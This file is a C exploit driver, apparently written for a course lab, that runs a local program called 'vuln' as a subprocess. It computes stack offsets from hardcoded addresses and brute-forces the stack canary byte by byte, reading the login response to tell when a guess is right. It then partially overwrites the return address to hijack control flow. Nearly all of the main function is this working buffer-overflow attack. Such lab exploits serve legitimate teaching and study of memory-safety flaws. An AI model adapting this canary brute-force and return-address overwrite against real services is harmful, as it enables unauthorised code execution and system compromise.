#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdint.h>
#include <errno.h>
#include <stdbool.h>

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;

   uint64_t auth_bp			=	0x7ffd08e9ee90;
   uint64_t auth_cred_loc		=	0x7ffd08e9ee80; 
   uint64_t auth_cred			=	0x7ffd08e9ed90;
   uint64_t auth_plen_loc		=	0x7ffd08e9ee50;
   uint64_t auth_ulen_loc		=	0x7ffd08e9ee60; 
   
   // Compute the required offsets offsets
   uint64_t auth_bp_cred_dist		= auth_bp - auth_cred;
   uint64_t auth_canary_cred_dist	= auth_bp - auth_cred - sizeof(void *);
   uint64_t auth_plen_cred_dist	= auth_plen_loc - auth_cred;
   uint64_t auth_ulen_cred_dist	= auth_ulen_loc - auth_cred;
   
   
   
   
   printf("auth canary cred dist = %lx\n", auth_canary_cred_dist);
   printf("auth bp cred dist = %lx\n", auth_bp_cred_dist);
   create_subproc("./vuln", nargv);
   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on vuln, go ahead and do that now. Press 'enter' when you are ready to continue with the exploit\n");
   getchar();
   get_formatted("%*s"); //Needed to clear out the Welcome message


   uint64_t canary = 0x0;
   uint64_t mask = 0x00000000000000ff;
   
   for (int i = 0; i < 8; i++) {
   
   	// Allocate and prepare a buffer that contains the exploit string.
   	// -8 for password and "_" added by auth fn
   	// -8 for not
   	// +(i + 1) for overwriting the canary byte
   
   	unsigned explsz = auth_canary_cred_dist - 8 + (i + 1);
   	printf("Exploit size for i = %d is: %d\n", i, explsz);
   	char *expl = (char *)malloc(explsz);
   
   	// Initialize the buffer with '\0' to make the contents predictable.
   	memset((char*)expl, '\0', explsz);
   
   	// Set the desired parts of the exploit string
   	// expl[auth_plen_cred_dist/sizeof(void *) - 1] = '\1';
   	// expl[auth_ulen_cred_dist/sizeof(void *) - 1] = '\1';
   
   	for (int k = 0; k < i; k++) {
   		expl[auth_canary_cred_dist - 8 + k] = (canary >> (8 * k)) & mask;
   	}
   	
   	for (int j = 0; j < 256; j++) {
   		
   		printf("i = %d, j = %d\n", i, j);
   		expl[explsz - 1] = j;


		// Send the payload
		put_str("p 1234567\n");
		send();
		get_formatted("%*s");

   		
   		// Send the exploit string
   		put_str("u ");
   		put_bin((char *)expl, explsz);
   		put_str("\n");
   		send();
   		get_formatted("%*s");
   
   		// Now attempt to login
   		put_str("l \n");
   		send();
   		get_formatted("%*s");
   		
   		printf("i = %d, j = %d, output = %s\n", i, j, outbuf);
   		
   		// Check for the received response
   		if (strstr(outbuf, "Login denied") != NULL) {
   			// canary byte successfully found
   			canary = canary | ((uint64_t) j << (8 * i));
   			printf("Updated canary = %lx\n", canary);
   			break;	
   		}
   	}
   }
   
   
   
   // Partial overwrite on the return address
   // -8 for password + "_"
   // +8 for the canary
   // +8 for saved RBP
   // +1 for LSB of the return address
   unsigned explsz = auth_canary_cred_dist - 8 + 8 + 8 + 1;
   char *expl = (char *)malloc(explsz);
   
   
   // Initialize the buffer with '\0' to make the contents predictable.
   memset((char*)expl, '\0', explsz);
   
   
   // Set the canary value
   for (int i = 0; i < 8; i++) {
   	expl[auth_canary_cred_dist - 8 + i] = (canary >> (8 * i)) & mask;
   }
   
   int lsb = 0xc0;
   // Send the payload
   put_str("p 1234567\n");
   send();
   get_formatted("%*s");

	
   // Set the LSB of return address
   expl[explsz - 1] = lsb;
	
   // Send the exploit string
   put_str("u ");
   put_bin((char *)expl, explsz);
   put_str("\n");
   send();
   get_formatted("%*s");

   // Now attempt to login
   put_str("l \n");
   send();
   get_formatted("%*s");
	

 
 
   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);

   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
